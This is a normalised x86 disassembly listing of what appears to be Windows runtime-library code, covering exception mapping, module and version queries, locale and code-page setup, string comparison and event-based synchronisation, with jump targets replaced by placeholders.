jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bd94
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bf4f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405eac
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_40420c
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_4087d4
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bf56
lea eax [ ebp - 0x170 ]
call sub_403f9c
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403fc0
lea eax [ ebp - 0x4 ]
call sub_403f9c
retn
sub_40bf5e
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40c01b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bcfc
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b938
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
push ebp
call sub_40bd94
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c022
lea eax [ ebp - 0x10 ]
call sub_403f9c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405eac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b974
mov ebx eax
sub_40c03c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40c02c
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bd7c
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax r-xdata
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bce4
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c0c0
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_40324c
xor eax eax
mov [ rw-data ] eax
sub_40c140
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_40420c
sub_40c1d0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c2a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404034
lea eax [ ebp - 0x8 ]
call j_sub_404468#2
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40445c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c2ad
lea eax [ ebp - 0x8 ]
call sub_403f9c
retn
mov eax ebx
call sub_4027b4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c289
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40445c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027d4
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c2bc
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c334
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40445c
mov edx esi
dec edx
call sub_40c2bc
sub_40c370
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40425c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c398
pop esi
pop ebx
retn
mov eax ebx
call sub_40425c
mov esi eax
sub_40c398
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40425c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c5a8
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c3f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40425c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c5a8
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c5a8
dec eax
mov ebx eax
sub_40c480
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40425c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c3f0
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40425c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c4e4
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40425c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40425c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c3f0
mov eax esi
call sub_40425c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40425c
mov [ esp ] eax
jmp r-xdata
sub_40c56c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40445c
add eax esi
dec eax
call sub_40c544
sub_40c5a8
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40445c
add eax ebx
dec eax
call sub_40c544
add eax ebx
sub_40c5e4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40445c
push eax
mov eax esi
call sub_40445c
mov ebp eax
mov eax ebp
pop edx
call sub_40c6a8
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c61c
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_4080d8
mov eax esi
call sub_40425c
mov ebp eax
mov eax edi
mov edx ebp
call sub_4045e8
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404468
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404468
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404468
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c6a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408904
mov [ esp ] eax
mov eax ebp
call sub_408904
mov edi eax
mov edx ebp
mov eax esi
call sub_408a9c
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c358
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408a9c
mov ebx eax
inc ebx
sub_40c748
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c770
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c770
test eax eax
jne r-xdata
sub_40c770
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408a88
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c358
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408a88
mov edi eax
test edi edi
jne r-xdata
sub_40c7b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c814
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_40420c
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_40842c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c81b
lea eax [ ebp - 0xc ]
call sub_403f9c
retn
sub_40c824
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c7b0
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c89c
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c884
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c824
pop ecx
push ebp
call sub_40c824
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d7c
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40ca10
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40ccdb
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c89c
call sub_40b220
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b170
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403ff0
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_40842c
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_40842c
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b1bc
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b1bc
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_40842c
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b1bc
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b4a8
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403ff0
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b4a8
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403ff0
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b1bc
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b170
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403ff0
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b170
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403ff0
lea eax [ ebp - 0x8 ]
call sub_403f9c
lea eax [ ebp - 0xc ]
call sub_403f9c
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_40842c
test eax eax
jne r-xdata
call sub_40b3f8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404034
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404034
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40431c
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40431c
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b1bc
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cce2
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403fc0
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_40842c
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b170
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_40842c
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404034
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404034
jmp r-xdata
sub_40cd88
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40ceab
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404034
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404034
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_4080a4
lea edx [ ebp - 0xc ]
mov eax edi
call sub_4080a4
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_404034
mov eax esi
call sub_403f9c
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c5e4
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ceb2
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_403fc0
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4044bc
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_40431c
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_40425c
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_4044bc
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404264
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40425c
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_4044bc
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404264
jmp r-xdata
sub_40cec4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40cf54
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b124
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba30
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_4039d8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cf5b
lea eax [ ebp - 0x14 ]
call sub_403f9c
retn
sub_40cfac
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax r-xdata
mov [ rw-data ] eax
sub_40d030
push ebx
push esi
push edi
push ebp
call sub_4035d8
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_4027d4
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_40323c
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035c0
sub_40d098
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d080
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d120
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407ee0
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d020
mov [ ebp ] eax
sub_40d120
push ebx
mov ebx eax
mov eax ebx
call sub_40d080
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d020
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d160
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40321c
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_40321c
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403570
mov eax esi
pop esi
pop ebx
retn
call sub_4035c8
pop [ fs : 0x0 ]
add esp 0xc
sub_40d1d4
push ebx
push esi
call sub_4035d8
mov ebx edx
mov esi eax
mov eax esi
call sub_40d260
mov edx ebx
and dl 0xfc
mov eax esi
call sub_40323c
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_40324c
test bl bl
jle r-xdata
pop esi
pop ebx
